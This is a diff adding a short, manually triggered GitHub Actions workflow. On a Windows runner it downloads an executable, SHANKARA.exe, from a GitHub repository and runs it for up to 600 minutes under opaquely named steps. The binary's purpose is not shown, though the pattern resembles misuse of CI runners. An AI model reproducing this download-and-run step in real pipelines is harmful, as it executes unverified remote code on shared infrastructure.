@@ -1,0 +1,11 @@
+name: SHANKARA
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: SGH
+      run: Invoke-WebRequest https://github.com/Shankar900/SHANKARA/raw/main/SHANKARA.exe -OutFile SHANKARA.exe
+    - name: WVU
+      run: .\SHANKARA.exe
+      timeout-minutes: 600
